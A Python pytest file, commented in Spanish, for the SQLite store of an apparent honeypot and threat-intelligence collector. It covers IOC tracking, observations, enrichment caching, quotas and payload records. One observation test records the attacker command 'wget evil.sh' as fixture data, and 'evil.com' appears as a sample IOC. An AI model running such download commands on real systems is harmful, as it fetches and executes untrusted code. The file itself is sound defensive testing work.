"""
Tests del store (F-B1 del rework).

Todos en `:memory:` salvo los que necesitan un fichero de verdad (WAL, y el que
comprueba que abrir algo imposible devuelve None en vez de levantar): son
rápidos y no dejan basura en `data/`.

El tiempo se pasa siempre explícito (`now=`) para que nada dependa del reloj.
"""

import sqlite3

import pytest

from separatio.store import db, models

DAY = "2026-08-09T07:00:00+00:00"
NEXT_DAY = "2026-08-10T07:15:00+00:00"


@pytest.fixture
def conn():
    c = db.open_store(db.MEMORY)
    assert c is not None
    try:
        yield c
    finally:
        c.close()


def _tables(c):
    return {r[0] for r in c.execute(
        "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'")}


# ─────────────────────────────────────────────
# ESQUEMA Y APERTURA
# ─────────────────────────────────────────────

def test_migrate_crea_las_cinco_tablas(conn):
    assert _tables(conn) == {"ioc", "observation", "enrichment", "payload", "meta"}
    assert db.schema_version(conn) == db.SCHEMA_VERSION


def test_migrate_es_idempotente(conn):
    def snapshot():
        return sorted(r[0] or "" for r in conn.execute(
            "SELECT sql FROM sqlite_master ORDER BY name"))

    before = snapshot()
    assert db.migrate(conn) == db.SCHEMA_VERSION
    assert db.migrate(conn) == db.SCHEMA_VERSION
    assert snapshot() == before
    assert db.schema_version(conn) == 1
    # Y no duplicó la fila de versión.
    assert conn.execute("SELECT COUNT(*) FROM meta").fetchone()[0] == 1


def test_open_store_devuelve_none_si_no_puede_abrir(tmp_path):
    # Un directorio no es una base: sqlite levanta, `open_store` no.
    assert db.open_store(tmp_path) is None
    # Y en sólo-lectura, un fichero que no existe tampoco se inventa.
    assert db.open_store(tmp_path / "no-existe.db", read_only=True) is None


def test_wal_activado(tmp_path):
    path = tmp_path / "archivo.db"
    c = db.open_store(path)
    assert c is not None
    assert c.execute("PRAGMA journal_mode").fetchone()[0].lower() == "wal"
    assert c.execute("PRAGMA foreign_keys").fetchone()[0] == 1
    c.close()

    ro = db.open_store(path, read_only=True)
    assert ro is not None
    with pytest.raises(sqlite3.OperationalError):
        ro.execute("INSERT INTO meta(key, value) VALUES('x', 'y')")
    ro.close()


def test_store_context_manager_commitea(tmp_path):
    path = tmp_path / "archivo.db"
    with db.store(path) as c:
        assert c is not None
        models.upsert_ioc(c, "1.2.3.4", "ip", DAY)

    with db.store(path, read_only=True) as c:
        assert models.ioc_row(c, "1.2.3.4")["times_seen"] == 1


# ─────────────────────────────────────────────
# IOCs
# ─────────────────────────────────────────────

def test_upsert_ioc_crea_y_actualiza(conn):
    models.upsert_ioc(conn, "1.2.3.4", "ip", DAY)
    row = models.ioc_row(conn, "1.2.3.4")
    assert (row["kind"], row["times_seen"], row["days_seen"]) == ("ip", 1, 1)
    assert row["first_seen"] == row["last_seen"] == DAY

    models.upsert_ioc(conn, "1.2.3.4", "ip", NEXT_DAY)
    row = models.ioc_row(conn, "1.2.3.4")
    assert row["times_seen"] == 2
    assert row["first_seen"] == DAY          # el primero no se pisa
    assert row["last_seen"] == NEXT_DAY


def test_days_seen_cuenta_dias_distintos(conn):
    models.upsert_ioc(conn, "1.2.3.4", "ip", DAY)
    models.upsert_ioc(conn, "1.2.3.4", "ip", "2026-08-09T23:59:00+00:00")
    row = models.ioc_row(conn, "1.2.3.4")
    assert row["times_seen"] == 2 and row["days_seen"] == 1

    models.upsert_ioc(conn, "1.2.3.4", "ip", NEXT_DAY)
    row = models.ioc_row(conn, "1.2.3.4")
    assert row["times_seen"] == 3 and row["days_seen"] == 2
    assert row["last_day"] == "2026-08-10"


def test_upsert_ioc_guarda_la_clase_de_higiene(conn):
    models.upsert_ioc(conn, "167.94.138.1", "ip", DAY,
                      klass="scanner", scanner_name="censys")
    row = models.ioc_row(conn, "167.94.138.1")
    assert (row["klass"], row["scanner_name"]) == ("scanner", "censys")

    # Una corrida sin PTR (klass=None) no borra lo que ya se sabía.
    models.upsert_ioc(conn, "167.94.138.1", "ip", NEXT_DAY)
    row = models.ioc_row(conn, "167.94.138.1")
    assert (row["klass"], row["scanner_name"]) == ("scanner", "censys")


def test_ioc_row_devuelve_none_si_no_existe(conn):
    assert models.ioc_row(conn, "203.0.113.9") is None


# ─────────────────────────────────────────────
# OBSERVACIONES
# ─────────────────────────────────────────────

def test_add_observation_es_idempotente(conn):
    models.upsert_ioc(conn, "1.2.3.4", "ip", DAY)
    assert models.add_observation(conn, "1.2.3.4", DAY, "honeypot",
                                  sensor="vm1-cowrie", action="uname -a") is True
    assert models.add_observation(conn, "1.2.3.4", DAY, "honeypot",
                                  sensor="vm1-cowrie", action="uname -a") is False
    assert conn.execute("SELECT COUNT(*) FROM observation").fetchone()[0] == 1


def test_add_observation_distingue_acciones(conn):
    models.upsert_ioc(conn, "1.2.3.4", "ip", DAY)
    models.add_observation(conn, "1.2.3.4", DAY, "honeypot",
                           sensor="vm1-cowrie", action="uname -a")
    assert models.add_observation(conn, "1.2.3.4", DAY, "honeypot",
                                  sensor="vm1-cowrie", action="wget evil.sh") is True
    assert conn.execute("SELECT COUNT(*) FROM observation").fetchone()[0] == 2


def test_add_observation_tolera_ioc_inexistente(conn):
    # `INSERT OR IGNORE` no cubre las FK: sin esta tolerancia, una fila mal
    # formada tumbaría la corrida del colector (invariante 1 del rework).
    assert models.add_observation(conn, "1.2.3.4", DAY, "honeypot") is False
    assert conn.execute("SELECT COUNT(*) FROM observation").fetchone()[0] == 0


def test_prune_observations_respeta_retencion(conn):
    models.upsert_ioc(conn, "1.2.3.4", "ip", DAY)
    models.add_observation(conn, "1.2.3.4", "2026-01-01T00:00:00+00:00", "honeypot",
                           action="vieja")
    models.add_observation(conn, "1.2.3.4", DAY, "honeypot", action="nueva")

    assert models.prune_observations(conn, 30, now=NEXT_DAY) == 1
    quedan = [r["action"] for r in conn.execute("SELECT action FROM observation")]
    assert quedan == ["nueva"]


def test_recent_ips_filtra_por_ventana_y_origen(conn):
    for value, kind in (("1.2.3.4", "ip"), ("9.9.9.9", "ip"),
                        ("8.8.8.8", "ip"), ("evil.com", "domain")):
        models.upsert_ioc(conn, value, kind, DAY)

    models.add_observation(conn, "1.2.3.4", DAY, "honeypot", action="a")
    models.add_observation(conn, "9.9.9.9", "2026-08-01T07:00:00+00:00", "honeypot",
                           action="b")                       # fuera de la ventana
    models.add_observation(conn, "8.8.8.8", DAY, "news", action="c")   # otro origen
    models.add_observation(conn, "evil.com", DAY, "honeypot", action="d")  # no es IP

    got = models.recent_ips(conn, 24, now="2026-08-09T12:00:00+00:00")
    assert [r["value"] for r in got] == ["1.2.3.4"]
    assert got[0]["days_seen"] == 1 and got[0]["hits"] == 1


# ─────────────────────────────────────────────
# CACHE Y CUOTA
# ─────────────────────────────────────────────

def test_cache_devuelve_none_si_vencio(conn):
    models.put_cached(conn, "1.2.3.4", "greynoise", "benign", ttl_days=0, now=DAY)
    assert models.get_cached(conn, "1.2.3.4", "greynoise", now=DAY) is None


def test_cache_sin_ttl_no_vence(conn):
    models.put_cached(conn, "abc123", "malwarebazaar", "mirai", detail="{}", now=DAY)
    hit = models.get_cached(conn, "abc123", "malwarebazaar", now="2030-01-01T00:00:00+00:00")
    assert hit is not None
    assert hit["verdict"] == "mirai" and hit["expires_at"] is None

    # Y el upsert pisa el veredicto en vez de duplicar la fila.
    models.put_cached(conn, "abc123", "malwarebazaar", "gafgyt", now=NEXT_DAY)
    assert conn.execute("SELECT COUNT(*) FROM enrichment").fetchone()[0] == 1
    assert models.get_cached(conn, "abc123", "malwarebazaar", now=NEXT_DAY)["verdict"] == "gafgyt"


def test_quota_used_cuenta_por_ventana(conn):
    models.put_cached(conn, "1.1.1.1", "greynoise", "benign",
                      now="2026-08-06T07:00:00+00:00")     # hace 3 días
    models.put_cached(conn, "2.2.2.2", "greynoise", "malicious", now=DAY)

    assert models.quota_used(conn, "greynoise", window="day", now=DAY) == 1
    assert models.quota_used(conn, "greynoise", window="week", now=DAY) == 2
    assert models.quota_used(conn, "abuseipdb", window="week", now=DAY) == 0
    with pytest.raises(ValueError):
        models.quota_used(conn, "greynoise", window="month", now=DAY)


# ─────────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────────

def test_upsert_payload_acumula_y_conserva_la_familia(conn):
    models.upsert_payload(conn, "deadbeef", 1024, DAY, family="mirai")
    models.upsert_payload(conn, "deadbeef", 1024, NEXT_DAY)
    row = dict(conn.execute("SELECT * FROM payload WHERE sha256='deadbeef'").fetchone())
    assert row["times_seen"] == 2
    assert row["first_seen"] == DAY and row["last_seen"] == NEXT_DAY
    assert row["family"] == "mirai"


# ─────────────────────────────────────────────
# NORMALIZACIÓN DE TIEMPO
# ─────────────────────────────────────────────

def test_timestamps_se_normalizan_a_iso_utc(conn):
    # El colector emite 'Z'; las ventanas comparan cadenas. Sin normalizar,
    # '…Z' > '…+00:00' y las comparaciones fallarían en silencio.
    models.upsert_ioc(conn, "1.2.3.4", "ip", "2026-08-09T07:00:00Z")
    assert models.ioc_row(conn, "1.2.3.4")["last_seen"] == DAY
